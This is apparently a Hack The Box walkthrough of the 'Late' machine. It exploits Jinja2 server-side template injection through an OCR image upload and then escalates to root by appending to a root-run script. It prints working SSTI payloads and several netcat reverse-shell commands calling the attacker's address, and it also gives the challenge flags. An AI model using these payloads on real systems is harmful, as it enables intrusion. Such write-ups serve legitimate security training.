---
title: "HTB - Late"
categories: [box]
date: 2020-07-30
comments: true
image: /images/walkthroughs/hackthebox/late/logo.png
description: HTB - Late walkthrough
---

# Late

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/logo.png" width="500"/>
</p>


## Summary

Late is an easy box where we abuse an SSTI injection through the OCR system implemented in the website. The tough part is to make the OCR to recognize all the characters, specially the underscores and the quotes. Then the privesc was possible through the ssh-alert.sh script which could be appended by the svc_acc user we already owned.


## Enumeration


- NMap _nmap -sC -sV -oA nmap 10.10.11.156_:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 11:40 EDT
Nmap scan report for 10.10.11.156
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On the nmap we cannot see too much but two ports open, an SSH server and the port 80 with a website. Looking around it, we can detect the following technologies with wappalyzer:

- Nginx 1.14.0
- Jquery 1.10.2

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/1_0_web.png" width="90%"/>
</p>

At the bottom of the page we can see the following link:

http://images.late.htb/

We add the hostname into the /etc/hosts file and using that URL, we reach the tool, which is implemented in Flask (Python) as indicated in the title:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/2_0_images.png" width="90%"/>
</p>

I used the following image to see what the server is doing with the OCR output:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/test.png" width="30%"/>
</p>

Output:

```html
<p>aie]
</p>
```

Well... The OCR is not that great. But we can see that the output goes into an HTML. We can see that there is only extension check on the filename. Also the directory where its being loaded due to an error when we try gibberish in the extension:

```
Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/test.png622'
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/3_0_upload_bypass.png" width="90%"/>
</p>

Furthermore, there is a filter, since the '//' turns into '\_' when displayed in the error:

```
/home/svc_acc/app/uploads/test1234.png_.._.._asdf.png9970
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/3_1_filters.png" width="90%"/>
</p>

I stopped trying any kind of XXE or file upload vulnerabilities. Then I noticed the "Convert image to text **with Flask**" so I first thing I try on Python web apps are SSTI payloads.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/test_ssti.png" width="20%"/>
</p>

```python
{ {7*7} }
```

Output:

```html
<p>49
</p>
```

Se we have spotted an SSTI vulnerability, it seems like it's rendering the OCR output into the HTML without any escape or sanitization.

We are going hard with this payload:

```python
{ { ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() } }
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/test_3.png" width="90%"/>
</p>

And that was the output on the web browser:

```
Error occured while processing the image: 'str object' has no attribute 'class'
```
<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/3_2_error.png" width="70%"/>
</p>

There was many tries and payloads...

```python
{ {''.class.mro()[1].subclasses()} }


{ { "".class.mro()[1].subclasses()} }


# Working with some bypasses:

{ {() | attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()} }

{ { () | attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__') } }

# Using read function in index 245:

{ { () | attr('__class__')|attr('__base__')|attr('__subclasses__')[245] } }

```

Some responses from previous payloads:

```python

<p>&lt;built-in method __getitem__ of list object at 0x7f37f14bf108&gt;
</p>

245

 &lt;class &#39;pkgutil.ImpImporter&#39;&gt;,
 &lt;class &#39;pkgutil.ImpLoader&#39;&gt;,
 &lt;class &#39;subprocess.CompletedProcess&#39;&gt;,
 &lt;class &#39;subprocess.Popen&#39;&gt;,
 &lt;class &#39;pyexpat.xmlparser&#39;&gt;,
 &lt;class &#39;plistlib.Data&#39;&gt;,
 &lt;class &#39;plistlib._PlistParser&#39;&gt;,
 &lt;class &#39;plistlib._DumbXMLWriter&#39;&gt;,

```

I tried to get some extra information with working paylaods:

```python
{{ config }}

<p>&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
</p>
```

And after so many tries with different letter styles, backgrounds, font size and using spaces so the OCR algorithm can differenciate correctly the characters I got command execution. I used one of the short payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution):

```python
{ { cycler.__init__.__globals__.os.popen(' id ').read() } }
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/4_0_id.png" width="90%"/>
</p>

Output:

```
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
</p>
```

Then I started collecting some information from the environment before trying to spawn a revshell:

ls:
<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/4_1_ls.png" width="90%"/>
</p>

```python
{ { cycler.__init__.__globals__.os.popen(' ls ').read() } }
```

Output:

```html
<p>main.py
misc
__pycache__
static
templates
uploads
wsgi.py
</p>
```

Netcat:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/4_2_nc.png" width="90%"/>
</p>

```python
{ { cycler.__init__.__globals__.os.popen(' nc 10.10.14.58 4444 -e /bin/bash ').read() } }
```

Output:

```
Error occured while processing the image: 'type object' has no attribute 'init__'
```
<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/4_3_wget2.png" width="90%"/>
</p>

```python
{ { cycler.__init__.__globals__.os.popen(" wget http://10.10.14.58:5453 ").read() } }
```

It was success and get a request.

Tried to get as much information as possible while trying to get a reverse shell...

```python
{ { cycler.__init__.__globals__.os.popen(' cat main.py ').read() } }
```

main.py

```python
import datetime 
import os, random 
from flask.templating import render_template_string 
from werkzeug.utils import secure_filename 
import PIL.Image 
import pytesseract 
from PIL import Image 
from flask import Flask, request, render_template, redirect, url_for, session, send_file 
app = Flask(__name__) 
upload_dir = "/home/svc_acc/app/uploads" 
misc_dir = '/home/svc_acc/app/misc' 
allowed_extensions = ["jpg" ,'png'] 
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/' 

@app.route('/') 
def home(): 
  return render_template("index.html", title="Image Reader") 

@app.route('/scanner', methods=['GET', 'POST']) 
def scan_file(): 
  scanned_text = '' 
  results = '' 
  if request.method == 'POST': 
    start_time = datetime.datetime.now() 
    f = request.files['file'] 
    if f.filename.split('.')[-1] in allowed_extensions: 
      try: 
        ID = str(random.randint(1,10000)) 
        file_name = upload_dir + "/" + secure_filename(f.filename )+ ID 
        f.save(file_name) 
        pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract' 
        scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name)) 
        results = """<p>{}</p>""".format(scanned_text) 
        r = render_template_string(results) 
        path = misc_dir + "/" + ID + '_' + 'results.txt' 
        with open(path, 'w') as f: 
          f.write(r) 

        return send_file(path, as_attachment=True,attachment_filename='results.txt') 
      except Exception as e: 
        return ('Error occured while processing the image: ' + str(e)) 
  else: 
    return 'Invalid Extension'
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/4_3_wget2.png" width="90%"/>
</p>

And the final payload to get the reverse shell:

```python
{ { cycler.__init__.__globals__.os.popen(" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.192 4444 >/tmp/f ").read() } }
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/4_4_rev.png" width="90%"/>
</p>

And it worked:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/5_0_user.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/5_1_user.png" width="70%"/>
</p>

``` 2870e52b45c1cb066bda6a1828c5ebee ```


## Privesc

With pspy64 we could see that the user root is executing the following script:

```
CMD: UID=0    PID=2227   | /bin/bash /usr/local/sbin/ssh-alert.sh
CMD: UID=0    PID=2323   | chattr +a /usr/local/sbin/ssh-alert.sh 
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/6_0_pspy64.png" width="70%"/>
</p>

That script is owned by us, therefore, an edit with a rev shell at the end should do the job:

/usr/local/sbin/ssh-alert.sh:

```bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
``` 

When saving in nano it shows _[ Error writing /usr/local/sbin/ssh-alert.sh: Operation not permitted ]_

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/6_1_not_write.png" width="90%"/>
</p>

Checking the other attributes, we can see that we have append permission, so lets append to the file:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/6_2_apped.png" width="60%"/>
</p>

```bash
echo "mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" >> /usr/local/sbin/ssh-alert.sh
```

We iniciate a SSH into svc_acc user and we get the shell in our host.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/late/7_0_root.png" width="90%"/>
</p>

``` 7aa38494fb2a4439e9f2b73c055e00d1 ```
